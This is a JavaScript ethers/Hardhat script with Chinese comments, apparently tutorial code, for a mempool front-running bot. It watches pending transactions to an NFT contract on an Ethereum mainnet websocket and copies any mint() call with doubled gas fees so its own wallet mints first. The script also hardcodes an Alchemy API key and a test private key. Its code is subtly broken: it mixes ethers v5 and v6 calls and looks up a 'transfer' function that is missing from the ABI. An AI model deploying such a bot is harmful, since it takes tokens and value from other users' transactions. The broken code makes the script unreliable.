const { ethers } = require("hardhat");
const throttle = require('lodash.throttle') //安装throttle：npm install lodash.throttle
//wss://eth-mainnet.g.alchemy.com/v2/AXk8ifAkCTMh3R4QaKveR 
const ALCHEMY_MAINNET_WSSURL = 'wss://eth-mainnet.g.alchemy.com/v2/AXk8ifAkCTMh3R4QaKveR';//alchemy websocket节点，本地测试记得切换本地网络
const provider = new ethers.WebSocketProvider(ALCHEMY_MAINNET_WSSURL);

//2.构建contract实例
const contractABI = [
    "function mint() public",
    "function ownerOf(uint256) public view returns (address) ",
    "function totalSupply() view returns (uint256)"
]

const contractAddress = '0xC76A71C4492c11bbaDC841342C4Cb470b5d12193'//合约地址
const contractFM = new ethers.Contract(contractAddress, contractABI, provider)
//3.创建Interface对象，用于检索mint函数。
//V6版本 const iface = new ethers.Interface(contractABI)
const iface = new ethers.utils.Interface(contractABI)
function getSignature(fn) {
    // V6版本 return iface.getFunction("mint").selector
    return iface.getSighash(fn)
}
//4. 创建测试钱包，用于发送抢跑交易，私钥是foundry测试网提供
const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
const wallet = new ethers.Wallet(privateKey, provider)



const selector = iface.getFunction("transfer").selector
async function main() {
    let j = 0
    provider.on("pending", throttle(async (txHash) => {

        if (txHash && j <= 100) {
            // 获取tx详情
            let tx = await provider.getTransaction(txHash);
            j++;
            if (tx.data.indexOf(getSignature("mint")) !== -1 && tx.from !== wallet.address) {
                console.log(`[${(new Date).toLocaleTimeString()}]监听到交易:${txHash}\n准备抢先交易`)
                const frontRunTx = {
                    to: tx.to,
                    value: tx.value,
                    // V6版本 maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 2n， 其他运算同理。参考https://docs.ethers.org/v6/migrating/#migrate-bigint
                    maxPriorityFeePerGas: tx.maxPriorityFeePerGas.mul(2),
                    maxFeePerGas: tx.maxFeePerGas.mul(2),
                    gasLimit: tx.gasLimit.mul(2),
                    data: tx.data
                }
                const aimTokenId = (await contractFM.totalSupply()).add(1)
                console.log(`即将被mint的NFT编号是:${aimTokenId}`)//打印应该被mint的nft编号
                const sentFR = await wallet.sendTransaction(frontRunTx)
                console.log(`正在frontrun交易`)
                const receipt = await sentFR.wait()
                console.log(`frontrun 交易成功,交易hash是:${receipt.transactionHash}`)
                console.log(`铸造发起的地址是:${tx.from}`)
                console.log(`编号${aimTokenId}NFT的持有者是${await contractFM.ownerOf(aimTokenId)}`)//刚刚mint的nft持有者并不是tx.from
                console.log(`编号${aimTokenId.add(1)}的NFT的持有者是:${await contractFM.ownerOf(aimTokenId.add(1))}`)//tx.from被wallet.address抢跑，mint了下一个nft
                console.log(`铸造发起的地址是不是对应NFT的持有者:${tx.from === await contractFM.ownerOf(aimTokenId)}`)//比对地址，tx.from被抢跑
                //检验区块内数据结果
                const block = await provider.getBlock(tx.blockNumber)
                console.log(`区块内交易数据明细:${block.transactions}`)//在区块内，后发交易排在先发交易前，抢跑成功。
            }

        }
    }, 1000));
}

main().catch(console.error);

//npx hardhat run scripts/fristrun.js
